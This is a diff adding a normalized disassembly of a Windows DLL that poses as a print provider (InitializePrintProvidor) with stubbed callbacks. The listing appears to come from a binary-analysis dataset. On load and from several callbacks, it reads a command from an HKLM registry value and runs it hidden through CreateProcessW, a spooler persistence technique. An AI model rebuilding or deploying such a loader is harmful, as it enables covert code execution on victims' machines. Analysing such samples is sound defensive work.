@@ -1,0 +1,258 @@
+sub_10001000
+cmp eax 0x1000
+jae r-xdata
+push ecx
+lea ecx [ esp + 0x8 ]
+neg eax
+add eax esp
+add eax 0x4
+test [ eax ] eax
+xchg esp eax
+mov eax [ eax ]
+push eax
+retn
+sub ecx 0x1000
+sub eax 0x1000
+test [ ecx ] eax
+cmp eax 0x1000
+jae r-xdata
+sub ecx eax
+mov eax esp
+test [ ecx ] eax
+mov esp ecx
+mov ecx [ eax ]
+mov eax [ eax + 0x4 ]
+push eax
+retn
+_start
+push ebp
+mov ebp esp
+cmp [ ebp + 0xc ] 0x1
+jne r-xdata
+push esi
+push [ ebp + 0x10 ]
+push [ ebp + 0xc ]
+push [ ebp + 0x8 ]
+call sub_10001246
+cmp [ ebp + 0xc ] 0x0
+mov esi eax
+jne r-xdata
+call sub_10001099
+push rw-data
+push rw-data
+call sub_1000107f
+pop ecx
+pop ecx
+mov eax esi
+pop esi
+pop ebp
+retn 0xc
+call sub_100010b1
+sub_1000113f
+push ebp
+mov ebp esp
+sub esp 0x214
+push esi
+lea eax [ ebp - 0x4 ]
+push eax
+push r--data
+push 0x80000002
+call [ RegOpenKeyW@IAT ]
+push r--data
+lea eax [ ebp - 0x214 ]
+push eax
+call [ lstrcpyW@IAT ]
+xor esi esi
+cmp [ ebp - 0x4 ] esi
+je r-xdata
+push rw-data
+push rw-data
+push esi
+push esi
+push 0x8000000
+push esi
+push esi
+push esi
+lea eax [ ebp - 0x214 ]
+push eax
+push esi
+mov [ rw-data ] 0x44
+mov [ rw-data ] si
+mov [ rw-data ] esi
+mov [ rw-data ] 0x1
+mov [ rw-data ] esi
+mov [ rw-data ] esi
+mov [ rw-data ] esi
+mov [ rw-data ] esi
+mov [ rw-data ] esi
+mov [ rw-data ] esi
+mov [ rw-data ] esi
+mov [ rw-data ] esi
+mov [ rw-data ] esi
+mov [ rw-data ] esi
+mov [ rw-data ] esi
+mov [ rw-data ] esi
+mov [ rw-data ] esi
+mov [ rw-data ] si
+call [ CreateProcessW@IAT ]
+pop esi
+leave
+retn
+lea eax [ ebp - 0x8 ]
+push eax
+lea eax [ ebp - 0x214 ]
+push eax
+lea eax [ ebp - 0xc ]
+push eax
+push esi
+push r--data
+push [ ebp - 0x4 ]
+mov [ ebp - 0x8 ] 0x208
+mov [ ebp - 0xc ] 0x3
+call [ RegQueryValueExW@IAT ]
+push [ ebp - 0x4 ]
+call [ RegCloseKey@IAT ]
+InitializePrintProvidor
+mov edx [ esp + 0x8 ]
+test edx edx
+mov eax [ esp + 0x4 ]
+mov ecx eax
+je r-xdata
+mov [ eax ] sub_10001132
+mov [ eax + 0x4 ] sub_1000112d
+mov [ eax + 0x8 ] sub_10001128
+mov [ eax + 0xc ] sub_1000126c
+mov [ eax + 0x18 ] sub_10001123
+mov [ eax + 0x1c ] sub_1000111e
+mov [ eax + 0x20 ] sub_10001262
+mov [ eax + 0x4c ] sub_10001119
+mov [ eax + 0x54 ] sub_10001114
+mov [ eax + 0x5c ] sub_1000110f
+mov [ eax + 0x64 ] sub_1000110a
+mov [ eax + 0x68 ] sub_10001105
+mov [ eax + 0x6c ] sub_10001100
+mov [ eax + 0x7c ] sub_100010fb
+mov [ eax + 0x98 ] sub_100010f6
+mov [ eax + 0x9c ] sub_100010f1
+mov [ eax + 0xa0 ] sub_100010ec
+mov [ eax + 0xa4 ] sub_100010e7
+xor eax eax
+inc eax
+retn 0xc
+mov [ ecx ] 0x0
+inc ecx
+dec edx
+jne r-xdata
+sub_1000107f
+push esi
+mov esi [ esp + 0x8 ]
+pop esi
+retn
+mov eax [ esi ]
+test eax eax
+je r-xdata
+add esi 0x4
+jmp r-xdata
+call eax
+cmp esi [ esp + 0xc ]
+jae r-xdata
+sub_10001099
+push 0x20
+pop eax
+push 0x4
+push eax
+mov [ rw-data ] eax
+call sub_100010cd
+pop ecx
+mov [ rw-data ] eax
+pop ecx
+retn
+sub_100010b1
+mov ecx [ rw-data ]
+test ecx ecx
+je r-xdata
+retn
+mov eax [ rw-data ]
+lea ecx [ eax + ecx * 4 ]
+push ecx
+push eax
+call sub_1000107f
+pop ecx
+pop ecx
+sub_100010cd
+mov eax [ esp + 0x4 ]
+imul eax [ esp + 0x8 ]
+push eax
+push 0x8
+call [ GetProcessHeap@IAT ]
+push eax
+call [ HeapAlloc@IAT ]
+retn
+sub_100010e7
+xor eax eax
+retn 0xc
+sub_100010ec
+xor eax eax
+retn 0xc
+sub_100010f1
+xor eax eax
+retn 0xc
+sub_100010f6
+xor eax eax
+retn 0x18
+sub_100010fb
+xor eax eax
+retn 0x4
+sub_10001100
+xor eax eax
+retn 0x8
+sub_10001105
+xor eax eax
+retn 0x14
+sub_1000110a
+xor eax eax
+retn 0x4
+sub_1000110f
+xor eax eax
+retn 0x4
+sub_10001114
+xor eax eax
+retn 0x10
+sub_10001119
+xor eax eax
+retn 0xc
+sub_1000111e
+xor eax eax
+retn 0x14
+sub_10001123
+xor eax eax
+retn 0x10
+sub_10001128
+xor eax eax
+retn 0x18
+sub_1000112d
+xor eax eax
+retn 0x14
+sub_10001132
+push 0x7b
+call [ SetLastError@IAT ]
+xor eax eax
+retn 0xc
+sub_10001246
+mov eax [ esp + 0x8 ]
+dec eax
+jne r-xdata
+xor eax eax
+inc eax
+retn 0xc
+push [ esp + 0x4 ]
+call [ DisableThreadLibraryCalls@IAT ]
+call sub_1000113f
+sub_10001262
+call sub_1000113f
+xor eax eax
+retn 0x1c
+sub_1000126c
+call sub_1000113f
+xor eax eax
+retn 0x20
